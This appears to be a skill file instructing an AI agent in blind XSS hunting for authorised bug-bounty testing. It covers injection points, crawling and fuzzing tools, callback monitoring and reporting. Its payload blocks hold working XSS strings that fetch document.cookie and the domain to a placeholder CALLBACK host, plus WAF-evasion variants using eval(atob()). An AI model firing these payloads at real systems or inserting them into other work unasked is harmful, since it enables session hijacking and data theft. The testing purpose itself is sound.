# Skill: Blind XSS Hunter

You are hunting for Blind XSS vulnerabilities. These are XSS payloads that execute in a different context than where they are injected — typically in admin panels, support tickets, logs, or internal dashboards.

## What is Blind XSS?
- Payload is injected in one place (user-facing form)
- Payload executes in another place (admin panel viewing the data)
- The attacker never sees the execution directly
- Requires a callback mechanism to detect

## Hunting Methodology

### Step 1: Identify Injection Points
Look for any user input that might be viewed by staff/admins:
- Contact forms / support tickets
- Feedback forms
- User profile fields (name, bio, address)
- File upload names
- Comment systems
- Order notes / delivery instructions
- Error reporting forms
- Search queries that might be logged

### Step 2: Discover Endpoints
Use the HYDRA tools:
- `katana_crawl` the target with `js_crawl=true` to find forms
- `gau_urls` to find historical form endpoints
- `ffuf_fuzz` to discover hidden admin/support endpoints

### Step 3: Common Blind XSS Payloads

**WARNING: Only use these on authorized targets with proper scope!**

Basic detection payloads (replace CALLBACK with your listener):
```
"><script src=https://CALLBACK/xss.js></script>
"><img src=x onerror=fetch('https://CALLBACK/'+document.cookie)>
<svg/onload=fetch('https://CALLBACK/blind?c='+document.cookie)>
javascript:fetch('https://CALLBACK/'+document.domain)
```

Evasion payloads for WAF bypass:
```
"><svg/onload="fetch('https://CALLBACK/')">
"><details/open/ontoggle=fetch('https://CALLBACK/')>
"><img src=x onerror="eval(atob('BASE64_PAYLOAD'))">
```

### Step 4: Monitoring
- Set up a callback server (Burp Collaborator, XSSHunter, interactsh)
- Inject payloads in ALL identified input fields
- Wait for callbacks (can take hours/days)
- Document the execution context when a callback fires

### Step 5: Reporting
When a blind XSS fires:
1. Document the injection point (where you put the payload)
2. Document the execution context (from callback data)
3. Note what data was accessible (cookies, DOM, etc.)
4. Assess the impact (admin session hijack, etc.)
5. Use `save_finding` and `generate_report` to document

## Tips
- Blind XSS in admin panels is typically HIGH severity
- Include document.cookie, document.domain, and window.location in your callback
- Some blind XSS fires only when specific staff actions occur — be patient
- Always test with benign callbacks first before reporting
